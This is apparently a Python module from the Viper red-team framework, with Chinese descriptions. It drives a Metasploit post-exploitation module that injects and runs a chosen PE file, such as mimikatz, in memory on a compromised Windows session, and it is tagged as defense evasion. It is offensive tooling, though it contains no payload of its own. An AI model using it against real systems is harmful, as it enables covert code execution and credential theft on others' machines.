# -*- coding: utf-8 -*-
# @File  : SimplePostPythonModule.py
# @Date  : 2019/1/12
# @Desc  :

from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME_ZH = "内存执行PE文件(C++/C)"
    DESC_ZH = "在主机内存中注入PE文件并执行,文件后缀必须为exe.\n" \
              "模块只支持由C++及C编写的PE文件,如mimikatz,putty.\n" \
              "不支持由golang编写的exe文件,如nps,frp." \
              "如不需要获取输出(如session上线),无需勾选获取输出.\n" \
              "如需要获取PE执行之后的输出(如mimikatz),请勾选获取输出选项,并填写等待时间\n"
    MODULETYPE = TAG2TYPE.Defense_Evasion
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM", ]  # 所需权限
    ATTCK = ["T1055"]  # ATTCK向量
    README = ["https://www.yuque.com/vipersec/module/gks12e"]
    REFERENCES = ["https://attack.mitre.org/techniques/T1050/"]
    AUTHOR = "Viper"

    REQUIRE_SESSION = True
    OPTIONS = register_options([
        OptionFileEnum(ext=['exe']),
        OptionBool(name='CHANNELIZED', name_tag="获取输出", desc="是否需要获取shellcode执行后输出结果", required=True, default=True),
        OptionStr(name='ARGUMENTS', name_tag="命令行参数", desc="运行exe时输入的参数", option_length=24),
        OptionInt(name='WAIT_OUTPUT', name_tag="等待输出时间(秒)", desc="shellcode执行后等待输出结果的时间(秒)(3-180)", required=True,
                  default=3),
    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)
        self.type = "post"
        self.mname = "windows/manage/execute_pe_in_memory_api"

    def check(self):
        """执行前的检查函数"""
        pe = self.get_fileoption_filepath(msf=True)
        if pe is None:
            return False, "请选择执行PE文件,文件后缀必须为exe"
        else:
            self.set_msf_option(key='PE', value=pe)

        self.set_msf_option(key='CHANNELIZED', value=self.param('CHANNELIZED'))
        self.set_msf_option(key='ARGUMENTS', value=self.param('ARGUMENTS'))

        wait_ouput = self.param('WAIT_OUTPUT')
        if wait_ouput < 3:
            wait_ouput = 3
        elif wait_ouput > 180:
            wait_ouput = 180
        self.set_msf_option(key='WAIT_OUTPUT', value=wait_ouput)

        session = Session(self._sessionid)
        if session.is_alive:
            pass
        else:
            return False, "Session不可用"
        if session.is_windows:
            pass
        else:
            return False, "模块只支持Windows系统"

        return True, None

    def callback(self, status, message, data):
        if status:
            self.log_good("模块执行完成")
            self.log_good("新进程PID :{}".format(data.get("pid")))
            self.log_good("新进程输出 :{}".format(data.get("output")))
        else:
            self.log_error("模块执行失败")
            self.log_error(message)
